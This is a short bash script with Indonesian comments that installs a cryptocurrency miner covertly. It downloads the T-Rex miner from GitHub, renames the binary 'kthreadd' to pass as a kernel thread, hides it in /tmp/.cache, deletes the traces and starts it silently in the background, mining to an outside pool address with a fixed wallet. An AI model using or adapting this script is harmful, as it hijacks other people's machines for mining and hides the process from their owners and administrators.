#!/bin/bash

# Setup
URL="https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz"
ARCHIVE="t-rex-0.26.8-linux.tar.gz"
WORKDIR="PANEN"
MINER_NAME="t-rex"
NEW_NAME="kthreadd"
DEST="/tmp/.cache"

# Buat folder kerja
mkdir -p "$WORKDIR"
cd "$WORKDIR" || exit

# Download dan ekstrak
wget -q --show-progress "$URL"
tar -xf "$ARCHIVE"

# Rename dan pindah
mv "$MINER_NAME" "$NEW_NAME"
mkdir -p "$DEST"
mv "$NEW_NAME" "$DEST/"

# Bersih-bersih 
cd ..
rm -rf "$WORKDIR"

# Auto-jalankan proses 
nohup "$DEST/$NEW_NAME" -a kawpow -o store.myloveistrikupoppy.my.id:11001 -u AcgbSR2YfqEVVpqSDgpWnwpvCSiXtRWV25 -p x > /dev/null 2>&1 &

echo "Berhasil sayang~ File udah di $DEST/$NEW_NAME ~"
